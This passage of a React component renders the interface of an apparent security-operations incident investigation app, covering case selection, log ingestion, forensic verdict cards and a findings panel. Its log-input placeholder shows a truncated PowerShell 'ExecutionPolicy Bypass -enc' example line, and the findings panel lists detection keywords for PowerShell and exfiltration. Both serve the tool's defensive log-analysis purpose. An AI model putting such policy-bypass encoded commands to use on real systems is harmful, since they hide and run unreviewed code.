          {toastMessage.type === "info" && <Sparkles className="h-4 w-4 text-violet-600 flex-shrink-0" />}
          <p>{toastMessage.text}</p>
        </div>
      )}

      {/* Primary header navbar */}
      <header id="app-header" className="bg-white border-b border-slate-200 sticky top-0 z-40 px-6 py-3.5 flex flex-wrap items-center justify-between gap-4">
        <div className="flex items-center gap-2.5">
          {/* Logo visual launcher */}
          <button 
            id="logo-brand-btn"
            onClick={() => setCurrentView("landing")}
            className="flex items-center gap-2 text-left hover:opacity-85 transition-opacity cursor-pointer"
          >
            <div className="h-8.5 w-8.5 bg-violet-600 rounded-xl flex items-center justify-center text-white shadow shadow-violet-200 font-bold text-sm">
              <Shield className="h-4.5 w-4.5" />
            </div>
            <div>
              <span className="font-sans font-extrabold text-slate-900 tracking-tight text-sm block">IRIS Incident Studio</span>
              <span className="text-[10px] text-slate-400 font-bold block leading-none font-mono">SOC OPERATION NODE</span>
            </div>
          </button>
          
          <ChevronRight className="h-4 w-4 text-slate-300 hidden sm:inline" />

          {/* Active Case switching dropdown selector */}
          {cases.length > 0 && (
            <div className="flex items-center gap-1.5 ml-2">
              <span className="text-[10.5px] font-bold text-slate-400 uppercase hidden md:inline">InScope:</span>
              <select
                id="header-case-picker"
                value={activeCaseId}
                onChange={(e) => handleCaseSelect(e.target.value)}
                className="border border-slate-250 bg-white text-xs font-bold text-slate-700 rounded-xl px-3 py-1.5 focus:outline-none cursor-pointer max-w-xs truncate shadow-sm"
              >
                {cases.map((c) => (
                  <option key={c.id} value={c.id}>
                    [{c.id.substr(5, 4).toUpperCase()}] {c.title}
                  </option>
                ))}
              </select>
            </div>
          )}
        </div>

        {/* Core application navigation selectors */}
        <div className="flex items-center gap-1 bg-slate-100/85 rounded-xl p-1 border border-slate-250/50 text-xs font-semibold">
          <button
            id="tab-dashboard-select"
            onClick={() => setAppTab("dashboard")}
            className={`px-3.5 py-1.5 rounded-lg flex items-center gap-1.5 cursor-pointer transition-all ${
              appTab === "dashboard" ? "bg-white text-slate-900 shadow-sm font-bold" : "text-slate-500 hover:text-slate-800"
            }`}
          >
            📊 Security Dashboard
          </button>
          <button
            id="tab-cases-select"
            onClick={() => setAppTab("cases")}
            className={`px-3.5 py-1.5 rounded-lg flex items-center gap-1.5 cursor-pointer transition-all ${
              appTab === "cases" ? "bg-white text-slate-900 shadow-sm font-bold" : "text-slate-500 hover:text-slate-800"
            }`}
          >
            💼 Incidents Locker
          </button>
          <button
            id="tab-workspace-select"
            onClick={() => setAppTab("workspace")}
            className={`px-3.5 py-1.5 rounded-lg flex items-center gap-1.5 cursor-pointer transition-all ${
              appTab === "workspace" ? "bg-white text-slate-900 shadow-sm font-bold" : "text-slate-500 hover:text-slate-800"
            }`}
          >
            🔍 Investigation Workspace
          </button>
        </div>

        {/* Signout back to portal helper */}
        <div className="flex items-center gap-4">
          <button
            id="btn-return-portal"
            onClick={() => {
              setCurrentView("landing");
              triggerToast("Returned cleanly to main studio portal.", "info");
            }}
            className="text-xs font-bold text-slate-400 hover:text-slate-600 flex items-center gap-1 bg-slate-50 border border-slate-200 hover:border-slate-300 duration-150 px-3 py-1.5 rounded-lg cursor-pointer"
          >
            <LogOut className="h-3.5 w-3.5" /> Portal Intro
          </button>
        </div>
      </header>

      {/* Main body rendering container */}
      <main className="flex-1 max-w-7xl w-full mx-auto px-6 py-6 select-text overflow-y-auto">
        {isStaticMode && (
          <div className="mb-6 bg-amber-50/60 border border-amber-200/80 rounded-2xl p-4 flex flex-col sm:flex-row sm:items-center sm:justify-between gap-3 text-slate-800 shadow-sm animate-fade-in">
            <div className="flex items-start gap-3">
              <div className="h-9 w-9 bg-amber-100 rounded-xl flex items-center justify-center text-amber-700 flex-shrink-0 mt-0.5 animate-pulse">
                <Info className="h-5 w-5" />
              </div>
              <div>
                <h4 className="text-xs font-bold text-slate-900 flex items-center gap-2">
                  Client-Side Offline Mode Active
                  <span className="bg-amber-100 text-amber-800 text-[9px] font-extrabold uppercase px-1.5 py-0.5 rounded tracking-wide">Static Deployment Fallback</span>
                </h4>
                <p className="text-[11px] text-slate-600 mt-0.5 leading-relaxed">
                  The Node.js/Express server backend is unreachable (standard for static hosts like GitHub Pages). All preloaded demonstration cases, parsed log timelines, notes, and uploaded evidence are now running entirely client-side inside secure browser <strong>LocalStorage</strong>!
                </p>
              </div>
            </div>
            <button
              onClick={() => {
                if (window.confirm("Do you want to reset and re-seed the local client database with original preloaded demos? Any custom local changes will be reset.")) {
                  localStorage.removeItem("iris_local_db");
                  fetchCasesList();
                  triggerToast("Re-seeded Local Storage database cleanly!", "success");
                }
              }}
              className="text-[10px] font-bold bg-amber-100 hover:bg-amber-200/80 text-amber-900 border border-amber-250/50 px-3 py-1.5 rounded-lg flex items-center gap-1 cursor-pointer transition-colors self-start sm:self-center whitespace-nowrap"
            >
              <RefreshCw className="h-3 w-3" /> Reset / Re-Seed Demos
            </button>
          </div>
        )}

        {loadingCases ? (
          <div className="p-24 text-center text-slate-400 flex flex-col items-center justify-center space-y-2">
            <RefreshCw className="h-8 w-8 animate-spin text-violet-600" />
            <p className="text-xs font-bold text-slate-600">Retrieving security case channels...</p>
          </div>
        ) : (
          <>
            {/* View Tab: Dashboard */}
            {appTab === "dashboard" && (
              <Dashboard
                cases={cases}
                events={activeCaseDetails?.events || []}
                findings={activeCaseDetails?.findings || []}
                evidence={activeCaseDetails?.evidence || []}
                onQuickInject={handleQuickInject}
                onNavigateToCase={(caseId) => {
                  setActiveCaseId(caseId);
                  setAppTab("workspace");
                  setWorkspaceSubTab("timeline");
                }}
                onCreateCase={() => setAppTab("cases")}
              />
            )}

            {/* View Tab: Cases Management List */}
            {appTab === "cases" && (
              <CasesPage
                cases={cases}
                onCreateCase={handleCreateCase}
                onEditCase={handleEditCase}
                onDeleteCase={handleDeleteCase}
                onOpenCase={(caseId) => {
                  setActiveCaseId(caseId);
                  setAppTab("workspace");
                  setWorkspaceSubTab("timeline");
                }}
              />
            )}

            {/* View Tab: Investigation Workspace (Complex split layout) */}
            {appTab === "workspace" && activeCaseDetails && (
              <div id="investigation-split-workspace" className="grid grid-cols-1 xl:grid-cols-4 gap-6">
                
                {/* Left side parameters segment (Case Info, S3 locker evidence, ATT&CK visual) */}
                <div className="xl:col-span-1 space-y-6">
                  
                  {/* Case parameters card */}
                  <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm space-y-3.5">
                    <div className="space-y-1">
                      <span className="text-[10px] uppercase font-bold tracking-wider text-slate-400 font-mono">ACTIVE SECURITY AUDIT // ID: {activeCaseDetails.id}</span>
                      <h3 className="text-sm font-bold text-slate-900 leading-tight">{activeCaseDetails.title}</h3>
                      <p className="text-xs text-slate-500 mt-1.5 leading-relaxed">{activeCaseDetails.description}</p>
                    </div>

                    <div className="border-t border-slate-100 pt-3 grid grid-cols-2 gap-3 text-xs">
                      <div>
                        <span className="text-[9px] uppercase font-bold text-slate-400 block mb-0.5">Threat Level</span>
                        <span className={`inline-block px-2.5 py-0.5 rounded text-[10px] font-bold border ${
                          activeCaseDetails.severity === "Critical" ? "bg-rose-50 text-rose-600 border-rose-150" :
                          activeCaseDetails.severity === "High" ? "bg-amber-50 text-amber-600 border-amber-150" :
                          activeCaseDetails.severity === "Medium" ? "bg-blue-50 text-blue-600 border-blue-150" : "bg-slate-50 text-slate-600 border-slate-150"
                        }`}>
                          {activeCaseDetails.severity}
                        </span>
                      </div>
                      <div>
                        <span className="text-[9px] uppercase font-bold text-slate-400 block mb-0.5 font-sans">Investigation status</span>
                        <span className={`inline-flex items-center gap-1 px-2.5 py-0.5 rounded text-[10px] font-bold border ${
                          activeCaseDetails.status === "Resolved" ? "bg-emerald-50 text-emerald-700 border-emerald-150" :
                          activeCaseDetails.status === "Investigating" ? "bg-violet-50 text-violet-700 border-violet-150" : "bg-sky-50 text-sky-700 border-sky-150"
                        }`}>
                          • {activeCaseDetails.status}
                        </span>
                      </div>
                    </div>

                    <div className="border-t border-slate-100 pt-3">
                      <label className="text-[9px] uppercase font-bold text-slate-400 block mb-1">Modify Investigation parameters</label>
                      <div className="grid grid-cols-2 gap-2 text-xs">
                        <select
                          id="workspace-change-severity"
                          value={activeCaseDetails.severity}
                          onChange={(e) => handleEditCase(activeCaseDetails.id, { severity: e.target.value as CaseSeverity })}
                          className="border border-slate-200 bg-white rounded-lg p-1"
                        >
                          <option value="Low">Low Threat</option>
                          <option value="Medium">Medium Threat</option>
                          <option value="High">High Threat</option>
                          <option value="Critical">Critical Threat</option>
                        </select>
                        <select
                          id="workspace-change-status"
                          value={activeCaseDetails.status}
                          onChange={(e) => handleEditCase(activeCaseDetails.id, { status: e.target.value as CaseStatus })}
                          className="border border-slate-200 bg-white rounded-lg p-1"
                        >
                          <option value="Open">Status: Open</option>
                          <option value="Investigating">Status: Investigating</option>
                          <option value="Resolved">Status: Resolved</option>
                        </select>
                      </div>
                    </div>
                  </div>

                  {/* Evidence locker component */}
                  <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
                    <EvidenceLocker
                      caseId={activeCaseId}
                      evidenceList={activeCaseDetails.evidence || []}
                      caseEvents={activeCaseDetails.events || []}
                      onUploadEvidence={handleUploadEvidence}
                      onRemoveEvidence={handleRemoveEvidence}
                    />
                  </div>

                </div>

                {/* Center Panel (Timeline and Reporting builder tabs) */}
                <div className="xl:col-span-2 space-y-6">
                  
                  {/* Attack sequence interactive visual block */}
                  <AttackChain events={activeCaseDetails.events || []} />

                  {/* Core Timeline parser / Report toggler */}
                  <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm space-y-4">
                    <div className="flex bg-slate-150/70 p-1 rounded-xl border border-slate-200 max-w-[max-content] text-xs font-semibold">
                      <button
                        id="sub-tab-timeline-select"
                        onClick={() => setWorkspaceSubTab("timeline")}
                        className={`px-4.5 py-1.5 rounded-lg flex items-center gap-1.5 cursor-pointer transition-all ${
                          workspaceSubTab === "timeline" ? "bg-white text-slate-800 shadow-sm font-bold" : "text-slate-500 hover:text-slate-700"
                        }`}
                      >
                        <ClipboardList className="h-3.5 w-3.5" /> Investigation Steps
                      </button>
                      <button
                        id="sub-tab-report-select"
                        onClick={() => setWorkspaceSubTab("report")}
                        className={`px-4.5 py-1.5 rounded-lg flex items-center gap-1.5 cursor-pointer transition-all ${
                          workspaceSubTab === "report" ? "bg-white text-slate-800 shadow-sm font-bold" : "text-slate-500 hover:text-slate-700"
                        }`}
                      >
                        <FileText className="h-3.5 w-3.5" /> Intelligence Report
                      </button>
                    </div>

                    {workspaceSubTab === "timeline" ? (
                      <div className="space-y-6">
                        
                        {/* Interactive drag or manual log files parses with Real-time Right vs Wrong forensics */}
                        <div className="bg-zinc-50 p-5 rounded-2xl border border-zinc-200 shadow-inner space-y-4">
                          <div className="flex items-center justify-between">
                            <div>
                              <span className="text-[10px] uppercase font-bold text-violet-700 tracking-wider block">SOC Log Ingestion & Analytics Terminal</span>
                              <span className="text-[12.5px] font-extrabold text-slate-800 block mt-0.5">Evaluate Custom Logs (Secure vs Insecure)</span>
                            </div>
                            <div className="flex bg-zinc-200/50 p-0.5 rounded-lg text-[10.5px] font-bold">
                              <button
                                type="button"
                                onClick={() => setIngestionTab("upload")}
                                className={`px-2.5 py-1 rounded-md transition-all ${
                                  ingestionTab === "upload" ? "bg-white text-slate-800 shadow-sm" : "text-slate-500"
                                }`}
                              >
                                📁 Upload File
                              </button>
                              <button
                                type="button"
                                onClick={() => setIngestionTab("paste")}
                                className={`px-2.5 py-1 rounded-md transition-all ${
                                  ingestionTab === "paste" ? "bg-white text-slate-800 shadow-sm" : "text-slate-500"
                                }`}
                              >
                                ✍️ Paste Text
                              </button>
                            </div>
                          </div>

                          {ingestionTab === "upload" ? (
                            <div
                              id="log-dropzone"
                              onDragOver={(e) => {
                                e.preventDefault();
                                setUploadDragActive(true);
                              }}
                              onDragLeave={() => setUploadDragActive(false)}
                              onDrop={(e) => {
                                e.preventDefault();
                                setUploadDragActive(false);
                                if (e.dataTransfer.files && e.dataTransfer.files[0]) {
                                  const file = e.dataTransfer.files[0];
                                  const reader = new FileReader();
                                  reader.onload = (evt) => {
                                    handleLogFileUpload(file.name, (evt.target?.result as string) || "");
                                  };
                                  reader.readAsText(file);
                                }
                              }}
                              className={`border-2 border-dashed rounded-xl p-6 text-center transition-all relative cursor-pointer ${
                                uploadDragActive ? "border-violet-600 bg-violet-50/50" : "border-zinc-200 bg-white hover:bg-slate-50 hover:border-zinc-300"
                              }`}
                            >
                              <input
                                id="log-file-input"
                                type="file"
                                accept=".txt,.log,.json,.csv"
                                className="absolute inset-0 opacity-0 cursor-pointer"
                                onChange={(e) => {
                                  if (e.target.files && e.target.files[0]) {
                                    const file = e.target.files[0];
                                    const reader = new FileReader();
                                    reader.onload = (evt) => {
                                      handleLogFileUpload(file.name, (evt.target?.result as string) || "");
                                    };
                                    reader.readAsText(file);
                                  }
                                }}
                              />
                              <UploadCloud className="h-8 w-8 text-slate-400 mx-auto mb-2" />
                              <p className="text-xs font-bold text-slate-700">Drag your log file here, or click to browse</p>
                              <p className="text-[10px] text-slate-400 mt-1">Accepts standard .txt, .log, .json, and .csv data sheets</p>
                            </div>
                          ) : (
                            <form onSubmit={handleManualLogIngestSubmit} className="space-y-3">
                              <textarea
                                id="log-pasted-strings-input"
                                value={interactiveLogText}
                                onChange={(e) => setInteractiveLogText(e.target.value)}
                                placeholder="Example:&#10;2026-06-22T14:45:00 USER_LOGIN_SUCCESS j.admin IP=10.12.5.40 - MFA verified (authorized check)&#10;2026-06-22T14:47:11 POWERSHELL ExecutionPolicy Bypass -enc SQBFAFg..."
                                className="w-full text-[11px] font-mono p-3 border border-zinc-200 bg-white rounded-xl focus:outline-none focus:ring-1 focus:ring-violet-500 h-24 resize-none leading-relaxed"
                              />
                              <div className="flex items-center justify-between">
                                <span className="text-[10px] text-slate-400 max-w-xs leading-tight">Paste logs to run server-side forensics check. Results stream instantly below.</span>
                                <button
                                  id="btn-manual-log-parse-submit"
                                  type="submit"
                                  className="px-4.5 py-2 bg-violet-600 hover:bg-violet-700 text-white rounded-xl text-xs font-bold transition-all shadow-sm cursor-pointer"
                                >
                                  Identify Milestones
                                </button>
                              </div>
                            </form>
                          )}

                          {/* Beautiful Forensics Analytics Verdict Report Card (What went Right vs Wrong) */}
                          {lastParsedReport && (
                            <div className="bg-white border border-zinc-200 p-4.5 rounded-xl space-y-4 shadow-sm">
                              <div className="flex items-center justify-between border-b border-zinc-100 pb-2.5">
                                <div className="space-y-0.5">
                                  <div className="flex items-center gap-2">
                                    <span className="text-[10px] bg-indigo-50 text-indigo-700 border border-indigo-100 px-2.5 py-0.5 rounded-full font-bold">
                                      Forensic Check Complete
                                    </span>
                                    <span className="text-[11px] font-mono text-slate-500 font-semibold truncate max-w-[150px]">
                                      {lastParsedReport.fileName}
                                    </span>
                                  </div>
                                  <p className="text-[11.5px] font-mono text-slate-400">Processed {lastParsedReport.totalLines} custom sequence records.</p>
                                </div>
                                <button
                                  type="button"
                                  onClick={() => setLastParsedReport(null)}
                                  className="p-1.5 text-slate-400 hover:text-slate-600 hover:bg-slate-100 rounded-full transition-colors cursor-pointer"
                                  title="Dismiss Report"
                                >
                                  <X className="h-4.5 w-4.5" />
                                </button>
                              </div>

                              {/* Risk metrics dial summary */}
                              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                {/* WHAT WENT RIGHT (Green Card) */}
                                <div className="bg-emerald-50/50 border border-emerald-100 rounded-xl p-3.5 space-y-2">
                                  <div className="flex items-center justify-between">
                                    <div className="flex items-center gap-1.5">
                                      <div className="h-5.5 w-5.5 rounded-full bg-emerald-100 border border-emerald-200 flex items-center justify-center text-emerald-700 text-xs font-bold">✓</div>
                                      <span className="text-xs font-extrabold text-emerald-950 uppercase tracking-wider">What Went Right</span>
                                    </div>
                                    <span className="text-[11px] font-mono bg-emerald-100/60 text-emerald-800 border border-emerald-200 px-2 py-0.5 rounded font-bold">
                                      {lastParsedReport.compliantCount} Verified Safe
                                    </span>
                                  </div>
                                  <p className="text-[10.5px] text-emerald-800 leading-relaxed">
                                    The following actions match secure system baselines, policy-compliant logins, and general standard system operations:
                                  </p>
                                  <div className="space-y-1.5 max-h-40 overflow-y-auto font-mono text-[9px] pr-1">
                                    {lastParsedReport.events.filter(e => !e.isSuspicious).length === 0 ? (
                                      <p className="text-slate-400 italic py-1">No compliant actions extracted in log segment.</p>
                                    ) : (
                                      lastParsedReport.events.filter(e => !e.isSuspicious).map((e, idx) => (
                                        <div key={idx} className="bg-white/80 p-1.5 rounded border border-emerald-100 text-emerald-900 leading-tight">
                                          <div className="font-bold flex justify-between">
                                            <span>[RIGHT] {e.event}</span>
                                            <span className="text-[8px] text-slate-400">{(e.timestamp || "").substr(11, 8)}</span>
                                          </div>
                                          <p className="text-[8.5px] mt-0.5 text-slate-600 line-clamp-2">{e.description}</p>
                                        </div>
                                      ))
                                    )}
                                  </div>
                                </div>

                                {/* WHAT WENT WRONG (Red Card) */}
                                <div className="bg-rose-50/50 border border-rose-100 rounded-xl p-3.5 space-y-2">
                                  <div className="flex items-center justify-between">
                                    <div className="flex items-center gap-1.5">
                                      <div className="h-5.5 w-5.5 rounded-full bg-rose-100 border border-rose-200 flex items-center justify-center text-rose-700 text-xs font-bold">✖</div>
                                      <span className="text-xs font-extrabold text-rose-950 uppercase tracking-wider">What Went Wrong</span>
                                    </div>
                                    <span className="text-[11px] font-mono bg-rose-100/60 text-rose-800 border border-rose-200 px-2 py-0.5 rounded font-bold">
                                      {lastParsedReport.threatsCount} Alerts Flagged
                                    </span>
                                  </div>
                                  <p className="text-[10.5px] text-rose-800 leading-relaxed">
                                    These activities triggered high-severity alarms, suspicious command flags, credential dump checks, or data leak patterns:
                                  </p>
                                  <div className="space-y-1.5 max-h-40 overflow-y-auto font-mono text-[9px] pr-1">
                                    {lastParsedReport.events.filter(e => e.isSuspicious).length === 0 ? (
                                      <p className="text-emerald-700 italic py-1 font-semibold">✔ Congratulations, zero threat vectors flagged from this source file!</p>
                                    ) : (
                                      lastParsedReport.events.filter(e => e.isSuspicious).map((e, idx) => (
                                        <div key={idx} className="bg-white/90 p-1.5 rounded border border-rose-100 text-rose-900 leading-tight">
                                          <div className="font-bold flex justify-between text-rose-800">
                                            <span>[WRONG] {e.event}</span>
                                            <span className="text-[8px] text-slate-400">{(e.timestamp || "").substr(11, 8)}</span>
                                          </div>
                                          <p className="text-[8.5px] mt-0.5 text-slate-600 line-clamp-2">{e.description}</p>
                                          {e.techniqueId && (
                                            <span className="inline-block mt-1 text-[7.5px] px-1 py-0.2 bg-red-50 text-red-700 rounded border border-red-200">
                                              MITRE: {e.techniqueId} - {e.techniqueName}
                                            </span>
                                          )}
                                        </div>
                                      ))
                                    )}
                                  </div>
                                </div>
                              </div>
                            </div>
                          )}
                        </div>

                        <TimelineBuilder
                          caseId={activeCaseId}
                          events={activeCaseDetails.events || []}
                          onAddTimelineEvent={handleAddTimelineEvent}
                          onDeleteTimelineEvent={handleDeleteTimelineEvent}
                          onReorderTimeline={handleReorderTimeline}
                        />
                      </div>
                    ) : (
                      <ReportSystem
                        caseId={activeCaseId}
                        activeCase={activeCaseDetails}
                        caseEvents={activeCaseDetails.events || []}
                        caseFindings={activeCaseDetails.findings || []}
                        caseEvidence={activeCaseDetails.evidence || []}
                        isStaticMode={isStaticMode}
                      />
                    )}
                  </div>

                </div>

                {/* Right Panel (Notepad editor and Auto-findings report) */}
                <div className="xl:col-span-1 space-y-6">
                  
                  {/* Notes template editor */}
                  <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm">
                    <NotesEditor
                      caseId={activeCaseId}
                      notes={activeCaseDetails.notes}
                      caseEvents={activeCaseDetails.events || []}
                      onSaveNotes={handleSaveNotes}
                    />
                  </div>

                  {/* Real-time Findings audit widget */}
                  <div className="bg-white p-5 rounded-2xl border border-slate-200 shadow-sm space-y-3">
                    <div className="border-b border-slate-100 pb-2">
                      <h4 className="text-[12px] uppercase tracking-wider font-extrabold text-slate-400 flex items-center gap-1.5">
                        🛡️ Real-Time Findings Engine
                      </h4>
                      <p className="text-[10px] text-slate-400 inline mt-1 block leading-relaxed">
                        Automatic heuristic scan identifies threat patterns internally during log uploads.
                      </p>
                    </div>

                    <div id="findings-checklist" className="space-y-2.5 max-h-60 overflow-y-auto pr-1">
                      {activeCaseDetails.findings.length === 0 ? (
                        <div className="text-center py-6 text-slate-400 border border-slate-100 rounded-xl bg-slate-50/50">
                          <p className="text-[10.5px] font-semibold">Heuristics scan complete. Zero alerts triggered.</p>
                          <p className="text-[9.5px] text-slate-400 mt-0.5">Heuristics evaluate terms such as 'powershell', 'exfil', 'failed'.</p>
                        </div>
                      ) : (
                        activeCaseDetails.findings.map((f) => (
                          <div
                            key={f.id}
                            className="bg-zinc-50 p-3 rounded-xl border border-slate-250 flex items-start gap-2.5 text-xs hover:border-slate-350 transition-colors"
                          >
                            <div className="h-5.5 w-5.5 bg-rose-50 text-rose-600 rounded flex items-center justify-center font-extrabold flex-shrink-0 text-[10px] mt-0.5 border border-rose-100">
                              ⚠️
                            </div>
                            <div className="space-y-1 flex-1">
                              <p className="font-bold text-slate-800 leading-tight">{f.title}</p>
                              <p className="text-[10.5px] text-slate-600 leading-relaxed font-sans">{f.description}</p>
                              
                              <p className="text-[10px] text-amber-700 italic leading-relaxed pt-0.5">Reason: {f.reason}</p>
                              
                              <div className="flex items-center gap-1.5 pt-1.5 font-mono text-[9.5px] font-bold text-slate-500">
                                <span>Confidence: {f.confidence}%</span>
                                <span>•</span>
                                <span className="text-rose-600 uppercase uppercase">{f.severity}</span>
                              </div>
                            </div>
                          </div>
                        ))
                      )}
                    </div>
                  </div>

                </div>

              </div>
            )}
          </>
        )}
      </main>
    </div>
  );
}
